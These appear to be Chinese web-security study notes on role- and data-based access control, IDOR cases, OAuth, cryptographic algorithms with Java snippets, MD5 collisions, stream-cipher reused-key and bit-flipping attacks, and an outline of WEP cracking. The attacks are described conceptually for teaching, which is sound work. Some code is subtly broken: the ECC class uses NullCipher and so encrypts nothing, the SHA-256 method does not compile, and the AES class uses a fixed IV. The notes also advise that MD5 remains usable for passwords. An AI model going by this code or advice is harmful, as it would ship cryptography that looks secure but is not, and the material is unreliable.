这两种访问控制都是RBAC模型的实现，换言之，在Spring Security中都是验证该用户所属的角色，以决定是否授权，不同的URL对于能访问其的角色有着不同的要求，虽然Spring Security的权限管理功能非常强大，但它缺乏一个管理界面可供用户灵活配置，因此每次调整权限时，都需要重新修改配置文件或代码，而其配置文件较为复杂，学习成本较高，维护成本也很高，除了Spring Security外，在PHP的流行框架Zend Framework中，使用的Zend ACL实现了一些基础的权限管理，[http://framework.zend.com/manual/en/zend.acl.html](http://framework.zend.com/manual/en/zend.acl.html)，不同于Spring Security使用配置文件管理权限，Zend ACL提供的是API级的权限框架，权限管理其实是业务需求上的一个问题，需要根据业务的不同需求来实现不同的权限管理，因此很多时候，系统都需要自己定制权限管理，定制一个简单的权限管理系统，不妨选择RBAC模型作为依据，这种基于角色的权限管理(RBAC模型)，我们可以称之为垂直权限管理，不同角色的权限有高低之分，高权限角色访问低权限角色的资源往往是被允许的，而低权限角色访问高权限角色的资源往往则被禁止，如果一个本属于低权限角色的用户通过一些方法能够获得高权限角色的能力，则发生了越权访问，在配置权限时，应当使用最小权限原则，并使用默认拒绝的策略，只对有需要的主体单独配置允许的策略，这在很多时候能够避免发生越权访问

#### <font color="yellow">003 水平权限管理</font>

优酷网用户越权访问问题(漏洞编号wooyun-2010-0129)，用户登录后，可以通过以下方式查看他人的来往信件(只要更改下面地址的数字id即可)，查看和修改他人的专辑信息，URL经过rewrite后将参数映射成URL路径，但这并不妨碍通过修改用户id来实现攻击，在这里，id代表资源的唯一编号，因此通过篡改id，就能改变要访问的资源，而优酷网显然没有检查这些资源是否属于当前用户，来伊份购物网站越权访问问题(漏洞编号wooyun-2010-01576)，来伊份购物网站没有对用户进行权限控制，通过变化URL中的id参数即可查看对应id的个人姓名、地址等隐私信息，同样的，id是用户的唯一标识，修改id即可修改访问的目标，网站后台应用并未判断资源是否属于当前用户，相对于垂直权限管理来说，水平权限问题出在同一个角色上，系统只验证了能访问数据的角色，既没有对角色内的用户做细分，也没有对数据的子集做细分，因此缺乏一个用户到数据之间的对应关系，由于水平权限管理是系统缺乏一个数据级的访问控制所造成的，因此水平权限管理又可以称之为基于数据的访问控制

在今天的互联网中，垂直权限问题已经得到了普遍的重视，并已经有了很多成熟的解决方案，但水平权限问题却尚未得到重视

- 对于一个大型的复杂系统来说，难以通过扫描等自动化测试方法将这些问题全部找出来
- 对于数据的访问控制，与业务结合得十分紧密，有的业务有数据级访问控制的需求，有的业务则没有，要理清楚不同业务的不同需求，也不是件容易的事情
- 如果在系统己经上线后再来处理数据级访问控制问题，则可能会涉及跨表、跨库查询，对系统的改动较大，同时也可能会影响到性能

这种种原因导致了现在数据级权限管理并没有很通用的解决方案，一般是具体问题具体解决，一个简单的数据级访问控制，可以考虑使用用户组(Group)的概念，比如一个用户组的数据只属于该组内的成员，只有同一用户组的成员才能实现对这些数据的操作，此外，还可以考虑实现一个规则引擎，将访问控制的规则写在配置文件中，通过规则引擎对数据的访问进行控制，水平权限管理问题，至今仍然是一个难题——它难以发现，难以在统一框架下解决，在未来也许会有新的技术用以解决此类问题

#### <font color="yellow">004 OAuth简介</font>

OAuth是一个在不提供用户名和密码的情况下，授权第三方应用访问Web资源的安全协议，OAuth 1.0于2007年12月公布，并迅速成为了行业标准(可见不同网站之间互通的需求有多么的迫切)，OAuth 1.0正式成为了RFC 584[http://tools.ietf.org/html/rfc5849](http://tools.ietf.org/html/rfc5849)，OAuth与OpenID都致力于让互联网变得更加的开放，OpenID解决的是认证问题，OAuth则更注重授权，认证与授权的关系其实是一脉相承的，后来人们发现，其实更多的时候真正需要的是对资源的授权，常见的应用OAuth的场景，一般是某个网站想要获取一个用户在第三方网站中的某些资源或服务

在OAuth 1.0中，涉及3个角色

- Consumer:消费方(Client)
- Service Provider:服务提供方(Server)
- User:用户(Resource Owner)

在新版本的OAuth中，又被称为Client、Server、Resource Owner，OAuth的发展道路并非一帆风顺，OAuth 1.0也曾经出现过一些漏洞[9]，因此OAuth也出过几个修订版本，最终才在2010年4月定稿OAuth 1.0为RFC 5849[http://oauth.net/adxisories/2009-1/](http://oauth.net/adxisories/2009-1/)，在这个版本中，修复了所有已知的安全问题，并对实现OAuth协议需要考虑的安全因素给出了建议[http://tools.ietf.org/html/rfc5849#section-4](http://tools.ietf.org/html/rfc5849#section-4)，OAuth 1.0已经成为了RFC标准，但OAuth 2.0仍然在紧锣密鼓的制定中，到2011年年底已经有了一个较为稳定的版本，OAuth 2.0吸收了OAuth 1.0的经验，做出了很多调整，它大大地简化了流程，改善了用户体验，两者并不兼容，但从流程上看区别不大
常见的需要用到OAuth的地方有桌面应用、手机设备、Web应用，但OAuth 1.0只提供了统一的接又，这个接又对于Web应用来说尚可使用，但手机设备和桌面应用用起来则会有些别扭，同时OAuth 1.0的应用架构在扩展性方面也存在一些问题，当用户请求数庞大时，可能会遇到一些性能瓶颈，为了改变这些问题，OAuth 2.0应运而生[http://hueniverse.com/2010/05/introducing-oauth-2-0/](http://hueniverse.com/2010/05/introducing-oauth-2-0/)

#### <font color="yellow">005 总结</font>

还分别介绍了垂直权限管理，它是一种基于角色的访问控制，以及水平权限管理，它是一种基于数据的访问控制，这两种访问控制方式，在进行安全设计时会经常用到，访问控制与业务需求息息相关，并非一个单纯的安全问题，因此在解决此类问题或者设计权限控制方案时，要重视业务的意见，无论选择哪种访问控制方式，在设计方案时都应该满足最小权限原则，这是权限管理的黄金法则

### <font color="yellow">05 加密算法与随机数</font>

#### <font color="yellow">001 使用加密算法的目的</font>

- 数据保密性，防止用户数据被窃取或泄露
- 数据完整性，防止用户传输的数据被篡改
- 通信双方身份确认，确保数据来源合法

#### <font color="yellow">002 常见的加密算法</font>

- 单向散列加密算法
	- md5
    - sha1
    - sha256
- 对称加密算法
	- des
	- 3des
	- aes
- 非对称加密算法
    - rsa
    - ecc

#### <font color="yellow">003 加密算法对比</font>

- 单向散列加密算法

    - md5

        运行速度：快
        安全性：中

    - sha1

        运行速度：慢
        安全性：高

    - sha256

        运行速度：极慢
        安全性：极高

- 对称加密算法

    - des

        密钥：56位
        运行速度：较快
        安全性：低
        资源消耗：中

    - 3des

        密钥：112位或168位
        运行速度：慢
        安全性：中
        资源消耗：高

    - aes

        密钥：128位或192位或256位
        运行速度：快
        安全性：高
        资源消耗：低

- 非对称加密算法

    - rsa

        成熟度：高
        安全性：高
        运算速度：中
        资源消耗：中

    - ecc

        成熟度：高
        安全性：高
        运算速度：慢
        资源消耗：高

#### <font color="yellow">004 单向散列加密</font>

单向散列加密算法常用于提取数据，验证数据的完整性，发送者将明文通过单向加密算法加密生成定长的密文串，然后将明文和密文串传递给接收方，接收方在收到报文后，将解明文使用相同的单向加密算法进行加密，得出加密后的密文串，随后与发送者发送过来的密文串进行对比，若发送前和发送后的密文串相一致，则说明传输过程中数据没有损坏，若不一致，说明传输过程中数据丢失了，其次也用于密码加密传递存储，单向加密算法只能用于对数据的加密，无法被解密，其特点为定长输出、雪崩效应

##### <font color="yellow">0001 md5加密</font>

MD5加密算法用的是哈希函数，一般应用于对信息产生信息摘要，防止信息被篡改，最常见的使用是对密码加密、生成数字签名，从严格意义上来说，MD5是摘要算法，并非加密算法，MD5生成密文时，无论要加密的字符串有多长，它都会输出长度为128bits的一个密文串，通常16进制时为32个字符

```java
public static final byte[] computeMD5(byte[] content) 
    {
    try 
        {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            return md5.digest(content);
        } 
    catch (NoSuchAlgorithmException e) 
        {
            throw new RuntimeException(e);
        }
    }
```

##### <font color="yellow">0002 sha1加密</font>

SHA1加密算法，与MD5一样，也是目前较流行的摘要算法，但SHA1比MD5的安全性更高，对长度小于2^64位的消息，SHA1会产生一个160位的消息摘要，基于MD5、SHA1的信息摘要特性以及不可逆，可以被应用在检查文件完整性，数字签名等场景

```java
public static byte[] computeSHA1(byte[] content)
    {
    try 
        {
          MessageDigest sha1 = MessageDigest.getInstance("SHA1");
          return sha1.digest(content);
        } 
    catch (NoSuchAlgorithmException e) 
        {
          throw new RuntimeException(e);
        }
    }
```

##### <font color="yellow">0003 sha256加密</font>

SHA256是SHA2算法中的一种

如SHA2加密算法中有

- SHA244
- SHA256
- SHA512

SHA2属于SHA1的升级，SHA1是160位的哈希值，而SHA2是组合值，有不同的位数，其中最受欢迎的是256位(SHA256算法)，SSL行业选择SHA作为数字签名的散列算法，从2011到2015，一直以SHA-1位主导算法，但随着互联网技术的提升，SHA-1的缺点越来越突显，2001年，SHA-2成为了新的标准，所以现在签发的SSL证书，必须使用该算法签名

```java
public static byte[] getSHA256(String str) 
    {
    MessageDigest messageDigest;
    String encodestr = "";
    try
        {
        messageDigest = MessageDigest.getInstance("SHA-256");
        messageDigest.update(str.getBytes("UTF-8"));
        return messageDigest.digest());
        } 
    catch (NoSuchAlgorithmException e) 
        {
        e.printStackTrace();
        } 
    catch (UnsupportedEncodingException e) 
        {
        e.printStackTrace();
        }
    }
```

#### <font color="yellow">005 对称加密</font>

对称加密算法采用单密钥加密，在数据传输过程中，发送方将原始数据分割成固定大小的块，经过密钥和加密算法逐个加密后，发送给接收方，接收方收到加密后的报文后，结合密钥和解密算法解密组合后得出原始数据，由于加解密算法是公开的，因此在这过程中，密钥的安全传递就成为了至关重要的事了，而密钥通常来说是通过双方协商，以物理的方式传递给对方，或者利用第三方平台传递给对方，一旦这过程出现了密钥泄露，不怀好意的人就能结合相应的算法拦截解密出其加密传输的内容，AES、DES、3DES都是对称的块加密算法，加解密的过程是可逆的

##### <font color="yellow">0001 des算法</font>

DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法，明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算(第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1)分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法，DES加密算法是对密钥进行保密，公开加密和解密算，只有知道发送方相同密钥的人才能解读获取的密文数据，想破译DES加密算法，就要搜索密钥的编码，对于56位长度的密钥来说，用穷举法，其运算次数为2^56次，

##### <font color="yellow">0002 3des算法</font>

3DES又称Triple DES，是DES加密算法的一种模式，它使用2条不同的56位的密钥对数据进行三次加密，DES使用56位密钥和密码块的方法，而在密码块的方法中，文本被分成64位大小的文本块然后再进行加密，比起最初的DES，3DES更为安全
```java
public class Des3
    {
    private static final String Algorithm = "DESede"; 
    /**
     * 加密
     * @param keybyte
     * @param src
     * @return
     */
    public static byte[] encryptMode(byte[] keybyte, byte[] src) 
        {
        try 
            {
            // 生成密钥
            SecretKey deskey = new SecretKeySpec(keybyte, Algorithm);
            // 加密
            Cipher c1 = Cipher.getInstance(Algorithm);
            c1.init(Cipher.ENCRYPT_MODE, deskey);
            return c1.doFinal(src);
            } 
        catch (java.security.NoSuchAlgorithmException e1) 
            {
            e1.printStackTrace();
            } 
        catch (javax.crypto.NoSuchPaddingException e2) 
            {
            e2.printStackTrace();
            } 
        catch (java.lang.Exception e3) 
            {
            e3.printStackTrace();
            }
        return null;
        }
    /**
     * 解密
     * @param keybyte 为加密密钥，长度为24字节
     * @param src 为加密后的缓冲区
     * @return
     */
    public static byte[] decryptMode(byte[] keybyte, byte[] src) 
        {
        try 
            {
            // 生成密钥
            SecretKey deskey = new SecretKeySpec(keybyte, Algorithm);
            // 解密
            Cipher c1 = Cipher.getInstance(Algorithm);
            c1.init(Cipher.DECRYPT_MODE, deskey);
            return c1.doFinal(src);
            } 
        catch (Exception e) 
            {
            e.printStackTrace();
            }
        return null;
        }
    // 转换成十六进制字符串
    public static String byte2hex(byte[] b) 
        {
        String hs = "";
        String stmp = "";
        for (int n = 0; n < b.length; n++) 
            {
            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
            if (stmp.length() == 1) 
                {
                hs = hs + "0" + stmp;
                } 
            else 
                {
                hs = hs + stmp;
                }
            if (n < b.length - 1) 
                {
                hs = hs + ":";
                }
            }
        return hs.toUpperCase();
        }
    }
```

##### <font color="yellow">0003 aes算法</font>
AES算法是密码学中的高级加密标准，同时也是美国联邦政府采用的区块加密标准，这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用，算法采用对称分组密码体制，密钥长度的最少支持为128位、192位、256位，分组长度128位，算法应易于各种硬件和软件实现，AES本身就是为了取代DES的，AES具有更好的安全性、效率和灵活性
```java
public class AESUtils 
    {
    /**
     * 加密
     *
     * @param content
     * @param strKey
     * @return
     * @throws Exception
     */
    public static byte[] encrypt(String content, String strKey) throws Exception 
        {
        SecretKeySpec skeySpec = getKey(strKey);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec("0102030405060708".getBytes());
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);
        return cipher.doFinal(content.getBytes());
        }


    /**
     * 解密
     *
     * @param strKey
     * @param content
     * @return
     * @throws Exception
     */
    public static String decrypt(byte[] content, String strKey) throws Exception 
        {
        SecretKeySpec skeySpec = getKey(strKey);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec("0102030405060708".getBytes());
        cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
        byte[] original = cipher.doFinal(content);
        String originalString = new String(original);
        return originalString;
        }


    private static SecretKeySpec getKey(String strKey) throws Exception 
        {
        byte[] arrBTmp = strKey.getBytes();
        byte[] arrB = new byte[16]; 
        for (int i = 0; i < arrBTmp.length && i < arrB.length; i++) 
            {
            arrB[i] = arrBTmp[i];
            }
        SecretKeySpec skeySpec = new SecretKeySpec(arrB, "AES");
        return skeySpec;
        }
    }
```

#### <font color="yellow">006 非对称加密算法</font>

非对称加密算法采用公钥(publickey)和私钥(privatekey)两种不同的密钥来进行加解密，公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密，反之亦然，因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法，非对称加密算法实现机密信息交换的基本过程是，甲方生成一对密钥并将公钥公开，需要向甲方发送信息的其他角色(乙方)使用该密钥(甲方的公钥)对机密信息进行加密后再发送给甲方，甲方再用自己私钥对加密后的信息进行解密，甲方想要回复乙方时正好相反，使用乙方的公钥对数据进行加密，同理，乙方使用自己的私钥来进行解密

##### <font color="yellow">0001 rsa算法</font>

RSA是目前最有影响力的公钥加密算法，也是被普遍认为是目前最优秀的公钥方案之一，RSA算法是第一个能同时用于加密和数字签名的算法，也易于理解和操作，RSA是被研究得最广泛的公钥算法，从提出到现今的三十多年里，经历了各种攻击的考验，逐渐为人们接受，截止2017年被普遍认为是最优秀的公钥方案之一，也已被ISO推荐为公钥数据加密标准

```java
public class RSAUtils 
    {
    
    public static final String KEY_ALGORITHM = "RSA";
    private static final String PUBLIC_KEY = "RSAPublicKey";
    private static final String PRIVATE_KEY = "RSAPrivateKey";

    /**
     * 私钥解密
     *
     * @param data 已加密数据
     * @param privateKey 私钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String decryptByPrivateKey(String data, String privateKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(privateKey);
        PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key privateK = keyFactory.generatePrivate(pkcs8KeySpec);
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.DECRYPT_MODE, privateK);
        byte[] buff = cipher.doFinal(Base64.decodeBase64(data));
        return new String(buff);
        }


    /**
     * 公钥解密
     *
     * @param data 已加密数据
     * @param publicKey 公钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String decryptByPublicKey(String data, String publicKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(publicKey);
        X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key publicK = keyFactory.generatePublic(x509KeySpec);
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.DECRYPT_MODE, publicK);
        // 执行解密操作
        byte[] buff = cipher.doFinal(Base64.decodeBase64(data));
        return new String(buff);
        }


    /**
     * 公钥加密
     *
     * @param data 源数据
     * @param publicKey 公钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String encryptByPublicKey(String data, String publicKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(publicKey);
        X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key publicK = keyFactory.generatePublic(x509KeySpec);
        // 对数据加密
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.ENCRYPT_MODE, publicK);
        byte[] buff = cipher.doFinal(data.getBytes());
        return Base64.encodeBase64String(buff);
        }


    /**
     * 私钥加密
     *
     * @param data 源数据
     * @param privateKey 私钥(BASE64编码)
     * @return
     * @throws Exception
     */
    public static String encryptByPrivateKey(String data, String privateKey) throws Exception 
        {
        byte[] keyBytes = Base64.decodeBase64(privateKey);
        PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM);
        Key privateK = keyFactory.generatePrivate(pkcs8KeySpec);
        Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());
        cipher.init(Cipher.ENCRYPT_MODE, privateK);
        byte[] buff = cipher.doFinal(data.getBytes());
        // 执行加密操作。加密后的结果通常都会用Base64编码进行传输
        return Base64.encodeBase64String(buff);
        }


    /**
     * 获取私钥
     *
     * @param keyMap 密钥对
     * @return
     * @throws Exception
     */
    public static String getPrivateKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PRIVATE_KEY);
        return Base64.encodeBase64String(key.getEncoded());
        }


    /**
     * 获取公钥
     *
     * @param keyMap 密钥对
     * @return
     * @throws Exception
     */
    public static String getPublicKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PUBLIC_KEY);
        return Base64.encodeBase64String(key.getEncoded());
        }


    /**
     * 生成密钥对(公钥和私钥)
     *
     * @return
     * @throws Exception
     */
    public static Map<String, Object> initKey() throws Exception 
        {
        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(KEY_ALGORITHM);
        keyPairGen.initialize(1024);
        KeyPair keyPair = keyPairGen.generateKeyPair();
        RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();
        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
        Map<String, Object> keyMap = new HashMap<String, Object>(2);
        keyMap.put(PUBLIC_KEY, publicKey);
        keyMap.put(PRIVATE_KEY, privateKey);
        return keyMap;
        }
    }
```

##### <font color="yellow">0002 ecc算法</font>

ECC(椭圆加密算法)是一种公钥加密体制，主要优势是在某些情况下它比其他的方法使用更小的密钥——比如RSA加密算法——提供相当的或更高等级的安全，不过一个缺点是加密和解密操作的实现比其他机制时间长，它相比RSA算法，对CPU消耗严重

```java
public abstract class ECCCoder extends Coder 
    {
    public static final String ALGORITHM = "EC";
    private static final String PUBLIC_KEY = "ECCPublicKey";
    private static final String PRIVATE_KEY = "ECCPrivateKey";


    /**
     * 用私钥解密
     * @param data
     * @param key
     * @return
     * @throws Exception
     */
    public static byte[] decrypt(byte[] data, String key) throws Exception 
        {
        // 对密钥解密
        byte[] keyBytes = decryptBASE64(key);
        // 取得私钥
        PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = ECKeyFactory.INSTANCE;
        ECPrivateKey priKey = (ECPrivateKey) keyFactory.generatePrivate(pkcs8KeySpec);
        ECPrivateKeySpec ecPrivateKeySpec = new ECPrivateKeySpec(priKey.getS(),priKey.getParams());
        // 对数据解密
        Cipher cipher = new NullCipher();
        cipher.init(Cipher.DECRYPT_MODE, priKey, ecPrivateKeySpec.getParams());
        return cipher.doFinal(data);
        }
    /**
     * 用公钥加密
     * @param data
     * @param privateKey
     * @return
     * @throws Exception
     */
    public static byte[] encrypt(byte[] data, String privateKey) throws Exception 
        {
        // 对公钥解密
        byte[] keyBytes = decryptBASE64(privateKey);
        // 取得公钥
        X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = ECKeyFactory.INSTANCE;
        ECPublicKey pubKey = (ECPublicKey) keyFactory.generatePublic(x509KeySpec);
        ECPublicKeySpec ecPublicKeySpec = new ECPublicKeySpec(pubKey.getW(), pubKey.getParams());
        Cipher cipher = new NullCipher();
        cipher.init(Cipher.ENCRYPT_MODE, pubKey, ecPublicKeySpec.getParams());
        return cipher.doFinal(data);
        }

    /**
     * 取得私钥
     * @param keyMap
     * @return
     * @throws Exception
     */
    public static String getPrivateKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PRIVATE_KEY);
        return encryptBASE64(key.getEncoded());
        }
    /**
     * 取得公钥
     * @param keyMap
     * @return
     * @throws Exception
     */
    public static String getPublicKey(Map<String, Object> keyMap) throws Exception 
        {
        Key key = (Key) keyMap.get(PUBLIC_KEY);
        return encryptBASE64(key.getEncoded());
        }
    }
```

#### <font color="yellow">007 md5详解</font>

##### <font color="yellow">0001 md5的用处</font>

无论是密码记录用户验证还是文件完整性存储，笼统的说就是验证数据是否匹配，数据库中使用明文记录密码明显是不可行的，但是使用MD5就不同了，MD5算法的高明之处就是不可逆，因为在算法中采取了抽样、分组等等算法，他不会将数据的所有内容加入运算，而是根据规则选择指定内容运算，所以，同样的字符串或者内容进行MD5运算的时候，得到的结果也是一样的，所以使用MD5记录密码，可以很有效的解决一些明文带来的问题，至于验证数据准确性就更加不用说了

##### <font color="yellow">0002 md5有相同</font>

MD5有相同这个已经算是被承认的，但是几率非常小，MD5相同的情况叫做碰撞，现在网络中已经出现了两个相同的MD5可执行文件，你可能会问，MD5相同到底会造成什么问题，一些网盘使用的是MD5的方式来验证文件是否已经被上传过，如果上传过就直接告诉用户上传过就好了，也就不用再次上传去占用而外的空间，假设Win9现在发布了，我马上就构造一个假的包含病毒的但是MD5和官方镜像相同的安装镜像放置到A网盘，A网盘使用MD5验证数据是否相同，那么现在的问题就是，用户下载的全部都是我制作的光盘，而非微软官方的，当然，这种构造的方法仍然是非常高级的东西，不是很容易能够做到的，字符串1：`4d c9 68 ff 0e e3 5c 20 95 72 d4 77 7b 72 15 87 d3 6f a7 b2 1b dc 56 b7 4a 3d c0 78 3e 7b 95 18 af bf a2 00 a8 28 4b f3 6e 8e 4b 55 b3 5f 42 75 93 d8 49 67 6d a0 d1 55 5d 83 60 fb 5f 07 fe a2`，字符串2：`4d c9 68 ff 0e e3 5c 20 95 72 d4 77 7b 72 15 87 d3 6f a7 b2 1b dc 56 b7 4a 3d c0 78 3e 7b 95 18 af bf a2 02 a8 28 4b f3 6e 8e 4b 55 b3 5f 42 75 93 d8 49 67 6d a0 d1 d5 5d 83 60 fb 5f 07 fe a2`，两个字符串的MD5值完全相同

##### <font color="yellow">0003 需要担心的问题</font>

MD5会发生碰撞已经是被发现的了，但是我们需要担心吗，我要说的是，目前为止还不用担心，首先要构造MD5碰撞是非常难的，理论上字符串越长MD5就越不可能相同，并且借助SHA-1算法的帮助，双管齐下，也就没有太大问题了，所以现在MD5还没有轮到被弃用的时候

##### <font color="yellow">0004 sha-1是否会碰撞</font>

SHA-1也会发生碰撞，但是几率比MD5小的多

##### <font color="yellow">0005 如何解决碰撞</font>

解决碰撞其实可以通过MD5和SHA-1结合使用来实现，我是这样做的，首先将文件A的MD5值记为B再把A的SHA-1记为C，之后用将B和C相加之后再次运算MD5值就好了，MD5值碰撞的几率已经很小，再结合SHA-1的话，基本上就不会发生碰撞的问题出现了，在新的算法普及之前，MD5还是可以继续使用的

#### <font color="yellow">008 概述</font>

加密算法与伪随机数算法是开发中经常会用到的东西，但加密算法的专业性非常强，在Web开发中，如果对加密算法和伪随机数算法缺乏一定的了解，则很可能会错误地使用它们，最终导致应用出现安全问题，密码学有着悠久的历史，它满足了人们对安全的最基本需求————保密性，密码学可以说是安全领域发展的基础，在Web应用中，常常可以见到加密算法的身影，最常见的就是网站在将敏感信息保存到Cookie时使用的加密算法，加密算法的运用是否正确，与网站的安全息息相关，常见的加密算法通常分为分组加密算法与流密码加密算法，两者的实现原理不同，分组加密算法基于分组(block)进行操作，根据算法的不同，每个分组的长度可能不同

分组加密算法的代表

- DES
- 3-DES
- Blowfish
- IDEA
- AES
- ...

流密码加密算法，则每次只处理一个字节，密钥独立于消息之外，两者通过异或实现加密与解密

流密码加密算法的代表

- RC4
- ORYX
- SEAL
- ...

针对加密算法的攻击，一般根据攻击者能获得的信息，可以分为

- 唯密文攻击

    攻击者有一些密文，它们是使用同一加密算法和同一密钥加密的
    这种攻击是最难的

- 已知明文攻击

    攻击者除了能得到一些密文外，还能得到这些密文对应的明文

- 选择明文攻击

    攻击者不仅能得到一些密文和明文，还能选择用于加密的明文

- 选择密文攻击

    攻击者可以选择不同的密文来解密
    Padding Oracle Attack就是一种选择密文攻击

密码学在整个安全领域中是非常大的一个课题

#### <font color="yellow">009 Stream Cipher Attack</font>

流密码是常用的一种加密算法，与分组加密算法不同，流密码的加密是基于异或(XOR)操作进行的，每次都只操作一个字节，但流密码加密算法的性能非常好，因此也是非常受开发者欢迎的一种加密算法

常见的流密码加密算法

- RC4
- ORYX
- SEAL
- ...

##### <font color="yellow">0001 Reused Key Attack</font>

在流密码的使用中，最常见的错误便是使用同一个密钥进行多次加/解密，这将使得破解流密码变得非常简单，这种攻击被称为Reused Key Attack，在这种攻击下，攻击者不需要知道密钥，即可还原出明文，假设有密钥C、明文A、明文B，那么XOR可以表示为

```
E(A) = A xor C
E(B) = B xor C
```

这种密文是公开于众的，因此很容易计算

```
E(A) xor E(B)
```

因为两个相同的数进行XOR运算的结果是0

```
E(A) xor E(B) = (A xor C) xor (B xor C) = A xor B xor C xor C = A xor B
```

这意味着4个数据中，只需要知道3个，就可以推导出剩下的一个，如果存在初始化向量，则相同明文每次加密的结果均不同，将增加破解的难度，即不受此攻击影响，因此当`$ckey_length = 4;`时，`authcode()`将产生随机密钥，算法的强度也就增加了，如果IV不够随机，攻击者有可能找到相同的IV，则在相同IV的情况下仍然可以实施Reused Key Attack

##### <font color="yellow">0002 Bit-flipping Attack</font>

再次回到这个公式

```
E(A) xor E(B) = A xor B
```

由此可以得出

```
A xor E(A) xor B = E(B)
```

这意味着当知道A的明文、B的明文、A的密文时，可以推导出B的密文，这在实际应用中非常有用，比如一个网站应用，使用Cookie作为用户身份的认证凭证，而Cookie的值是通过XOR加密而得的，认证的过程就是服务器端解密Cookie后，检查明文是否合法，假设明文是`username + role`，那么当攻击者注册了一个普通用户A时，获取了A的Cookie为`Cookie(A)`，就有可能构造出管理员的Cookie，从而获得管理员权限

```
(accountA + member) xor Coolie(A) xor (admin_account + manager) = Coolie(admin)
```

在密码学中，攻击者在不知道明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式，被称为Bit-flipping Attack[http://en.wikipedia.org/wili/Bit-flipping_attack](http://en.wikipedia.org/wili/Bit-flipping_attack)，解决Bit-flipping攻击的方法是验证密文的完整性，最常见的方法是增加带有KEY的MAC(消息验证码，Message Authentication Code)，通过MAC验证密文是否被篡改，通过哈希算法来实现的MAC，称为HMAC，HMAC由于其性能较好，而被广泛使用在`authcode()`中，其实已经实现了HMAC，所以攻击者在不知晓加密KEY的情况下，是无法完成Bit-flipping攻击的，其中，密文的前10个字节用于验证时间是否有效，10~26个字节即为HMAC，用于验证密文是否被篡改，26个字节之后才是真正的密文，这个值与两个因素有关，一个是真正的密文`:substr($result，26)`，一个是`$keyb`，而`$keyb?`又是由加密密钥KEY变化得到的，因此在不知晓KEY的情况下，这个HMAC的值是无法伪造出来的，因此HMAC有效地保证了密文不会被篡改

##### <font color="yellow">0003 弱随机IV问题</font>

在`authcode()`函数中，它默认使用了4字节的IV(就是函数中的keyc)，使得破解难度增大，但其实4字节的IV是很脆弱的，它不够随机，我们完全可以通过暴破的方式找到重复的IV，为了验证这一点，调整一下破解程序，在大约16秒后，共遍历了19295个不同的XOR KEY，找到了相同的IV，顺利破解出明文

#### <font color="yellow">010 WEP破解</font>

流密码加密算法存在Reused Key Attack和Bit-flipping Attack等攻击方式，而在现实中，一种最著名的针对流密码的攻击可能就是WEP密钥的破解，WEP是一种常用的无线加密传输协议，破解了WEP的密钥，就可以以此密钥连接无线的Access Point，WEP采用RC4算法，也存在这两种攻击方式，WEP在加密过程中，有两个关键因素，一个是初始化向量IV，一个是对消息的CRC-32校验，而这两者都可以通过一些方法克服，IV以明文的形式发送，在WEP中采用24bit的IV，但这其实不是很大的一个值，假设一个繁忙的AP，以11Mbps的速度发送大小为1500bytes的包，则1500*8/(11*10^6)*2^24 =~18000秒，约为5个小时，因此最多5个小时，IV就将耗光，不得不开始出现重复的IV，在实际情况中，并非每个包都有1500bytes大小，因此时间会更短，IV一旦开始重复，就会使得Reused Key Attack成为可能，同时通过收集大量的数据包，找到相同的IV，构造出相同的CRC-32校验值，也可以成功实施Bit-flipping Attack，破解WEP的理论变得可行了，Berkly的Nikita Borisov，Ian Goldberg以及David Wagner共同完成了一篇很好的论文Security of the WEP algorithm，其中深入阐述了WEP破解的理论基础[http://www.isaac.cs.berkeley.edu/isaac/wep-faq.html](http://www.isaac.cs.berkeley.edu/isaac/wep-faq.html)

实际破解WEP的步骤要稍微复杂一些，Aircrack实现了这一过程

- 加载目标
- 与目标网络进行协商
- 生成密钥流
- 构造ARP包
- 生成自己的ARP包
